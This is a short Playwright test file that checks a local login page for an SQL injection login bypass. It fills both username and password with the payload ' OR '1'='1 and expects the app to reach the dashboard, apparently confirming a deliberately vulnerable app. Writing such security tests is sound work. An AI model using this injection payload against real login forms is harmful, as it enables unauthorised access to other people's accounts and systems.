const { test, expect } = require('@playwright/test');

test('insecure: sqli allows login bypass', async ({ page }) => {
    await page.goto('http://localhost:3000/login');

    const payload = "' OR '1'='1";

    await page.fill('input[name="username"]', payload);
    await page.fill('input[name="password"]', payload);
    await page.click('button[type="submit"]');

    // land on dashboard even though creds are fluff
    await expect(page).toHaveURL(/\/dashboard/);
  });